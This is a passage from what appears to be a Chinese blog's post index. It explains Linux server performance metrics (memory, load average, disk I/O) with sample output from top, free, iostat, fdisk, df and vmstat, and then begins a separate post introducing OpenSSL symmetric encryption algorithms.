pages&#x4FE1;&#x606F;&#xFF0C;&#x6BD4;&#x5982;&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6743;&#x9650;&#x7B49;&#x3002; top&#x5DE5;&#x5177;&#x65E2;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;CPU&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x4FE1;&#x606F;&#x3002; &#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7ECF;&#x5E38;&#x4F1A;&#x7528;&#x5230;&#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x4EE5;&#x53CA;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x8FD9;&#x51E0;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x8BA1;&#x7B97;&#x516C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A; &#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;MemUsed=MemTotal-MemFree //&#x5305;&#x542B;buffers&#x548C;cached &#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;-/+Used= MemTotal-MemFree-MemBuffers-MemCached &#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;MemUsed%=&#xFF08;MemUsed/ MemTotal&#xFF09;*100% &#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;-/+Used%=(-/+Used/ MemTotal&#xFF09;*100% &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x826F;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x8D85;&#x51FA;&#x5219;&#x8BF4;&#x660E;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7D27;&#x5F20;&#x3002; 2.3 &#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x5F53;&#x53D1;&#x73B0;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x5361;&#x65AD;&#x6216;&#x8005;&#x8FD0;&#x884C;&#x4E0D;&#x987A;&#x7545;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;uptime&#xFF0C;top&#x6216;&#x8005;w&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002; uptime uptimecommand wcommand topcommand Linux&#x7684;load average&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x7684;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x663E;&#x793A;&#x7684;&#x4E09;&#x4E2A;&#x6570;&#x503C;&#x5206;&#x522B;&#x8868;&#x793A;1&#x5206;&#x949F;&#x3001;5&#x5206;&#x949F;&#x548C;15&#x5206;&#x949F;&#x5185;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x548C;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x5E73;&#x5747;&#x8FDB;&#x7A0B;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x7406;&#x89E3;&#x4E3A;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x6D3B;&#x8DC3;&#x8FDB;&#x7A0B;&#x6570;&#x3002;&#x5176;&#x4E2D;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x662F;&#x6307;&#x6B63;&#x5728;&#x4F7F;&#x7528;CPU&#x6216;&#x8005;&#x6B63;&#x5728;&#x7B49;&#x5F85;CPU&#x7684;&#x8FDB;&#x7A0B;&#xFF08;&#x5904;&#x4E8E;R&#x72B6;&#x6001;&#xFF1A;Running&#x6216;&#x8005;Runnable&#x7684;&#x8FDB;&#x7A0B;&#xFF09;&#xFF1B;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x8FDB;&#x7A0B;&#x6307;&#x7684;&#x662F;&#x6B63;&#x5904;&#x4E8E;&#x5185;&#x6838;&#x6001;&#x5173;&#x952E;&#x6D41;&#x7A0B;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#xFF0C;&#x5904;&#x4E8E;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B;&#x662F;&#x4E0D;&#x53EF;&#x6253;&#x65AD;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x7B49;&#x5F85;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x7684;I/O&#x54CD;&#x5E94;&#x3002; &#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5F53;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x4E3A;4&#xFF1A; &#x5BF9;&#x4E8E;&#x53EA;&#x6709;1&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x5E73;&#x5747;&#x6709;3&#x4E2A;&#x8FDB;&#x7A0B;&#x7ADE;&#x4E89;&#x4E0D;&#x5230;CPU&#xFF1B; &#x5BF9;&#x4E8E;&#x62E5;&#x6709;4&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;100%&#xFF1B; &#x5BF9;&#x4E8E;&#x62E5;&#x6709;8&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;50%&#xFF0C;&#x6709;&#x4E00;&#x534A;&#x7A7A;&#x95F2;&#x3002; &#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x5982;&#x679C;&#x8D85;&#x8FC7;&#x7CFB;&#x7EDF;CPU&#x7684;&#x6570;&#x91CF;&#x65F6;&#xFF0C;&#x90A3;&#x4E48;&#x7CFB;&#x7EDF;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x8981;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002; &#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7ECF;&#x5E38;&#x4F1A;&#x901A;&#x8FC7;&#x6BD4;&#x8F83;1min&#x3001;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x53D8;&#x5316;&#x60C5;&#x51B5;&#xFF1A; &#x5982;&#x679C;1min&#x7684;&#x503C;&#x5927;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x589E;&#x52A0;&#xFF1B; &#x5982;&#x679C;1min&#x7684;&#x503C;&#x5C0F;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x51CF;&#x5C0F;&#xFF1B; 2.4 &#x78C1;&#x76D8;I/OLinux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x9664;&#x4E86;CPU&#x548C;&#x5185;&#x5B58;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x78C1;&#x76D8;IO&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x3002; 1234# RHEL/CentOS# yum install sysstatiostat -x -k 2 3 # &#x6BCF;&#x9694;2S&#x8F93;&#x51FA;&#x78C1;&#x76D8;IO&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x5171;&#x91C7;&#x6837;3&#x6B21; &#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A; rrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF0C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F1A;&#x5BF9;&#x8BFB;&#x53D6;&#x540C;&#x5757;(block)&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF1B; wrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x5199;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF1B; r/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x8BFB;&#x6B21;&#x6570;&#xFF1B; w/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x5199;&#x6B21;&#x6570;&#xFF1B; rkB/s: &#x6BCF;&#x79D2;&#x8BFB;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B; wkB/s: &#x6BCF;&#x79D2;&#x5199;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B; avgrq-sz:&#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x91CF;(&#x6247;&#x533A;&#x6570;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B; avgqu-sz: &#x5E73;&#x5747;&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;IO&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1B; await: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7B49;&#x5F85;&#x65F6;&#x95F4;(&#x5305;&#x62EC;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x548C;&#x5904;&#x7406;&#x65F6;&#x95F4;&#xFF0C;&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B; svctm: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;(&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B; %util: &#x91C7;&#x7528;&#x5468;&#x671F;&#x5185;&#x7528;&#x4E8E;IO&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x975E;&#x7A7A;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF1B; &#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91CD;&#x70B9;&#x5173;&#x6CE8;iowait%&#x548C;%util&#x53C2;&#x6570;&#x3002;&#x5176;&#x4E2D;iowait% &#x8868;&#x793A;CPU&#x7B49;&#x5F85;IO&#x65F6;&#x95F4;&#x5360;&#x6574;&#x4E2A;CPU&#x5468;&#x671F;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x5982;&#x679C;iowait&#x503C;&#x8D85;&#x8FC7;50%&#xFF0C;&#x6216;&#x8005;&#x660E;&#x663E;&#x5927;&#x4E8E;%system&#x3001;%user&#x4EE5;&#x53CA;%idle&#xFF0C;&#x8868;&#x793A;IO&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x4E86;&#xFF1B;%util&#x8868;&#x793A;&#x78C1;&#x76D8;&#x5FD9;&#x788C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x822C;%util&lt;=70%&#x8868;&#x793A;&#x8BE5;&#x78C1;&#x76D8;IO&#x4F7F;&#x7528;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002; 2.5 Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;2.5.1 CPU# &#x83B7;&#x53D6;CPU&#x8BE6;&#x60C5; cat /proc/sys/cpuinfo 12345678910111213141516171819202122232425262728[root@rhel7 ~]# cat /proc/cpuinfoprocessor : 0vendor_id : GenuineIntelcpu family : 6model : 158model name : Intel(R) Core(TM) i5-7400 CPU @ 3.00GHzstepping : 9microcode : 0xffffffffcpu MHz : 2998.708cache size : 6144 KBphysical id : 0siblings : 1core id : 0cpu cores : 1apicid : 0initial apicid : 0fpu : yesfpu_exception : yescpuid level : 22wp : yesflags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1bogomips : 5999.99clflush size : 64cache_alignment : 64address sizes : 45 bits physical, 48 bits virtualpower management:[root@rhel7 ~]# top 12345678910111213141516171819202122232425262728293031323334353637383940414243top - 05:37:21 up 2 days, 14:06, 2 users, load average: 0.00, 0.05, 0.07Tasks: 164 total, 1 running, 163 sleeping, 0 stopped, 0 zombie%Cpu(s): 0.3 us, 0.7 sy, 0.0 ni, 99.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 999696 total, 162172 free, 482632 used, 354892 buff/cacheKiB Swap: 2097148 total, 2064164 free, 32984 used. 303396 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 759 root 20 0 305248 3152 2824 S 0.3 0.3 5:39.77 vmtoolsd 1196 mysql 20 0 1131704 193936 564 S 0.3 19.4 1:15.66 mysqld 13017 root 20 0 1621100 76124 4316 S 0.3 7.6 1:13.35 mongod 1 root 20 0 128212 4532 2512 S 0.0 0.5 0:11.69 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.02 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:06.71 ksoftirqd/0 5 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 0:12.27 rcu_sched 10 root rt 0 0 0 0 S 0.0 0.0 0:03.50 watchdog/0 12 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 13 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 14 root 20 0 0 0 0 S 0.0 0.0 0:00.13 khungtaskd 15 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 writeback 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kintegrityd 17 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 bioset 18 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kblockd 19 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 md 25 root 20 0 0 0 0 S 0.0 0.0 0:01.89 kswapd0 26 root 25 5 0 0 0 S 0.0 0.0 0:00.00 ksmd 27 root 39 19 0 0 0 S 0.0 0.0 0:01.39 khugepaged 28 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 crypto 36 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kthrotld 38 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kmpath_rdacd 39 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kpsmoused 41 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 ipv6_addrconf 60 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 deferwq 93 root 20 0 0 0 0 S 0.0 0.0 0:13.32 kauditd 272 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 ata_sff 273 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 mpt_poll_0 274 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 mpt/0 278 root 20 0 0 0 0 S 0.0 0.0 0:00.00 scsi_eh_0 280 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 scsi_tmf_0 284 root 20 0 0 0 0 S 0.0 0.0 0:00.01 scsi_eh_1 286 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 scsi_tmf_1 2.5.2 &#x5185;&#x5B58;free -h12345[root@rhel7 ~]# free -h total used free shared buff/cache availableMem: 976M 659M 142M 1.4M 175M 140MSwap: 2.0G 215M 1.8G[root@rhel7 ~]# top 12345678910111213141516171819202122232425top - 05:38:40 up 2 days, 14:07, 2 users, load average: 0.50, 0.16, 0.23Tasks: 158 total, 1 running, 157 sleeping, 0 stopped, 0 zombie%Cpu(s): 1.4 us, 0.7 sy, 0.0 ni, 98.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 999936 total, 144896 free, 675384 used, 179656 buff/cacheKiB Swap: 2097148 total, 1876980 free, 220168 used. 143004 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 2492 root 20 0 1476824 89756 3588 S 1.0 9.0 4:59.62 mongod 2521 root 20 0 1508032 86256 3612 S 1.0 8.6 5:00.86 mongod 1410 root 20 0 1075224 65992 2844 S 0.3 6.6 13:18.62 mongod 1876 root 20 0 140832 1128 464 S 0.3 0.1 0:07.76 sshd 2802 root 20 0 1591648 110528 3800 S 0.3 11.1 4:43.63 mongod 3155 root 20 0 1062216 83944 3040 S 0.3 8.4 2:25.67 mongod 1 root 20 0 128044 2288 604 S 0.0 0.2 0:02.73 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.01 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:05.51 ksoftirqd/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 0:15.00 rcu_sched 10 root rt 0 0 0 0 S 0.0 0.0 0:05.00 watchdog/0 12 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 khelper 13 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 14 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 15 root 20 0 0 0 0 S 0.0 0.0 0:00.15 khungtaskd 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 writebac 2.5.3 &#x8D1F;&#x8F7D;uptime123[root@rhel7 ~]# uptime 05:39:08 up 2 days, 14:07, 2 users, load average: 0.33, 0.15, 0.22[root@rhel7 ~]# top1234567891011121314151617181920212223[root@rhel7 ~]# toptop - 05:38:40 up 2 days, 14:07, 2 users, load average: 0.50, 0.16, 0.23Tasks: 158 total, 1 running, 157 sleeping, 0 stopped, 0 zombie%Cpu(s): 1.4 us, 0.7 sy, 0.0 ni, 98.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 999936 total, 144896 free, 675384 used, 179656 buff/cacheKiB Swap: 2097148 total, 1876980 free, 220168 used. 143004 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 2492 root 20 0 1476824 89756 3588 S 1.0 9.0 4:59.62 mongod 2521 root 20 0 1508032 86256 3612 S 1.0 8.6 5:00.86 mongod 1410 root 20 0 1075224 65992 2844 S 0.3 6.6 13:18.62 mongod 1876 root 20 0 140832 1128 464 S 0.3 0.1 0:07.76 sshd 2802 root 20 0 1591648 110528 3800 S 0.3 11.1 4:43.63 mongod 3155 root 20 0 1062216 83944 3040 S 0.3 8.4 2:25.67 mongod 1 root 20 0 128044 2288 604 S 0.0 0.2 0:02.73 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.01 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:05.51 ksoftirqd/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 0:15.00 rcu_sched 10 root rt 0 0 0 0 S 0.0 0.0 0:05.00 watchdog/0 12 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 khelper 13 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs w123456[root@rhel7 ~]# w 05:39:57 up 2 days, 14:08, 2 users, load average: 0.14, 0.13, 0.22USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/1 192.168.73.1 Sat17 5.00s 0.56s 0.00s wroot pts/2 192.168.73.1 Sat17 9:33 0.30s 0.26s ping www.163.com[root@rhel7 ~]# 2.5.4 &#x78C1;&#x76D8;fdisk12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@rhel7 ~]# fdisk -lDisk /dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x000d2bb3 Device Boot Start End Blocks Id System/dev/sda1 * 2048 2099199 1048576 83 Linux/dev/sda2 2099200 41943039 19921920 8e Linux LVMDisk /dev/sdb: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdc: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sde: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdf: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdd: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdg: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-root: 18.2 GB, 18249416704 bytes, 35643392 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-swap: 2147 MB, 2147483648 bytes, 4194304 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes[root@rhel7 ~]# df1234567891011[root@rhel7 ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/mapper/rhel-root 17G 4.7G 13G 28% /devtmpfs 478M 0 478M 0% /devtmpfs 489M 0 489M 0% /dev/shmtmpfs 489M 6.8M 482M 2% /runtmpfs 489M 0 489M 0% /sys/fs/cgroup/dev/sr0 3.6G 3.6G 0 100% /media/cdrom/dev/sda1 1014M 121M 894M 12% /boottmpfs 98M 0 98M 0% /run/user/0[root@rhel7 ~]# 2.5.5 &#x6574;&#x4F53;vmstat12345[root@rhel7 ~]# vmstatprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 2 0 220132 137404 56 185372 0 1 6 6 87 12 0 0 99 0 0[root@rhel7 ~]# document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"OpenSSL使用教程","date":"2022-06-07T04:54:01.000Z","path":"/posts/e8c4eb08/","text":"OpenSSLOpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;OpenSSL&#x4E00;&#x5171;&#x63D0;&#x4F9B;&#x4E86;8&#x79CD;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;7&#x79CD;&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5; + 1&#x79CD;&#x6D41;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;RC4&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x5206;&#x522B;&#x662F;&#xFF1A;AES&#x3001;DES&#x3001;Blowfish&#x3001;CAST&#x3001;IDEA&#x3001;RC2&#x3001;RC5 &#x56DB;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x5206;&#x7EC4;&#x5BC6;&#x7801;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F; &#x7535;&#x5B50;&#x5BC6;&#x7801;&#x672C;&#x6A21;&#x5F0F;&#xFF08;ECB&#xFF09;&#x3001; &#x52A0;&#x5BC6;&#x5206;&#x7EC4;&#x94FE;&#x63A5;&#x6A21;&#x5F0F;&#xFF08;CBC&#xFF09;&#x3001; &#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09; &#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09; &#x5176;&#x4E2D;&#xFF1A;AES&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09;&#x548C;&#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09;&#x5206;&#x7EC4;&#x957F;&#x5EA6;&#x662F;128&#x4F4D;&#x5176;&#x5B83;&#x7B97;&#x6CD5;&#x4F7F;&#x7528;&#x7684;&#x5219;&#x662F;64&#x4F4D;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;DES&#x7B97;&#x6CD5;&#x91CC;&#x9762;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x5E38;&#x7528;&#x7684;DES&#x7B97;&#x6CD5;&#xFF0C;&#x8FD8;&#x652F;&#x6301;&#x4E09;&#x4E2A;&#x5BC6;&#x94A5;&#x548C;&#x4E24;&#x4E2A;&#x5BC6;&#x94A5;3DES&#x7B97;&#x6CD5;&#x3002; 